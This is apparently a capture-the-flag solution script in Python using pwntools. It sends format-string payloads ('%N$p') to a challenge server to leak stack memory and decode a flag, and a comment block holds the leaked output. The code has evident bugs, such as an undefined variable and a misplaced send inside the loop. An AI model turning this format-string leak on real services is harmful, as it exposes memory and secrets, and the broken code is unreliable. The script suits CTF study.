# Tsami - ctftime  
from pwn import * 

vp = remote("chals20.cybercastors.com", 14426)

#n : 
"""  0x55ada4bb6891.(nil).(nil).0x7ffd180128f0.0x7c.(nil).0x55ada4bb62a0.0x4373726f74736163.
0x5f6b34336c7b4654.0x3468745f6b34336c.0x74346d7230665f74.0x5f366e317274735f.0x7d6b34336c.0x7fabe52439e8.
(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x2000000000.(nil).(nil).(nil).0x1.0x103ae75f6.(nil).(nil).(nil).
(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x2431252e70243025.0x252e702432252e70.0x702434252e702433.
0x36252e702435252e.



"""
payload = ""
for i in range(100):
	payload += "%{}$p.".format(i)
	vp.sendline(payload)
	n = vp.readline()

n = text.strip().strip(".")
n =  n.split(".")[1:] 
n = map(lambda y: 0 if "nil" in y else int(y, 16), n)
print (n)
n= "".join(map(p64, n))

print(n)
log.info(hexdump(n))
